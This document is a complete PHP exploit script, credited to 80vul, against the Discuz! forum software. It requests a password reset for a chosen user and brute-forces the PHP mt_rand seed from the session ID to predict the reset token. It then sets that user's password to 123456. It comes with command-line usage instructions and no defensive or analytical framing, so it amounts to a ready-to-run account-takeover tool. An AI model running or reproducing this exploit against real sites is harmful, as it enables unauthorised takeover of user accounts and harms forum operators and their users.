#!/usr/bin/php
<?php

print_r('
+---------------------------------------------------------------------------+
Discuz! Reset User Password Exploit
by 80vul
team: http://www.80vul.com
+---------------------------------------------------------------------------+
');

if ($argc < 6) {
print_r('
+---------------------------------------------------------------------------+
Usage: php '.$argv[0].' host path user mail uid
host: target server (ip/hostname)
path: path to discuz
user: user login name
mail: user login mail
uid: user login id
Example:
php '.$argv[0].' localhost /discuz/ 80vul 80vul@80vul.com 2
+---------------------------------------------------------------------------+
');
exit;
}

error_reporting(7);
ini_set('max_execution_time', 0);

$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$mail = $argv[4];
$uid = $argv[5];

$fp = fsockopen($host, 80);

$data = "GET ".$path."viewthread.php HTTP/1.1\r\n";
$data .= "Host: $host\r\n";
$data .= "Keep-Alive: 300\r\n";
$data .= "Connection: keep-alive\r\n\r\n";

fputs($fp, $data);

$resp = '';

while ($fp && !feof($fp)) {
$resp .= fread($fp, 1024);
preg_match('/&amp;formhash=([a-z0-9]{8})/', $resp, $hash);
if ($hash)
break;
}

if ($hash) {
$cmd = 'action=lostpasswd&username='.urlencode($user).'&email='.urlencode($mail).'&lostpwsubmit=true&formhash='.$hash[1];
$data = "POST ".$path."member.php HTTP/1.1\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Referer: http://$host$path\r\n";
$data .= "Host: $host\r\n";
$data .= "Content-Length: ".strlen($cmd)."\r\n";
$data .= "Connection: close\r\n\r\n";
$data .= $cmd;

fputs($fp, $data);

$resp = '';

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

fclose($fp);

preg_match('/Set-Cookie:\s[a-zA-Z0-9]+_sid=([a-zA-Z0-9]{6});/', $resp, $sid);

if (!$sid)
exit("Exploit Failed!\n");

$seed = getseed();
if ($seed) {
mt_srand($seed);
random();
mt_rand();
$id = random();

$fp = fsockopen($host, 80);

$cmd = 'action=getpasswd&uid='.$uid.'&id='.$id.'&newpasswd1=123456&newpasswd2=123456&getpwsubmit=true&formhash='.$hash[1];
$data = "POST ".$path."member.php HTTP/1.1\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Referer: http://$host$path\r\n";
$data .= "Host: $host\r\n";
$data .= "Content-Length: ".strlen($cmd)."\r\n";
$data .= "Connection: close\r\n\r\n";
$data .= $cmd;

fputs($fp, $data);

$resp = '';

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

if (strpos($resp, '您的密码已重新设置，请使用新密码登录。') !== false)
exit("Expoilt Success!\nUser New Password:\t123456\n");
else
exit("Exploit Failed!\n");
} else
exit("Exploit Failed!\n");
} else
exit("Exploit Failed!\n");

function getseed()
{
global $sid;

for ($seed = 0; $seed <= 1000000; $seed ++) {
mt_srand($seed);
$id = random(6);
if ($id == $sid[1])
return $seed;
}
return false;
}

function random($length = 6)
{
$hash = '';
$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
$max = strlen($chars) - 1;
for ($i = 0; $i < $length; $i ++)
$hash .= $chars[mt_rand(0, $max)];

return $hash;
}

?>

